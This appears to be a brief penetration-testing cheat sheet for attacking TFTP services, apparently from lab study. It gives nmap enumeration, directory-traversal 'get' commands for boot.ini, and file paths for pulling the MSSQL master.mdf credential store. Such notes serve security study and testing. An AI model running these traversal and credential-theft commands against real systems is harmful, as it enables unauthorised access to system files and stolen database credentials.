# TFTP 
------

nmap:
```bash
nmap -sU -p69 --script tftp-enum [target]
```

```bash
tftp 10.11.1.111 69
```

- We can download files from tftp but not list directories.
- Download files using full path.

directory traversal:
```bash
tftp> get ..\..\..\..\..\boot.ini
tftp> get \boot.ini
```

Getting master.mdf file (MSSQL crendentials store file)
```txt
\Program Files\SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf
```

```txt
\PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf
```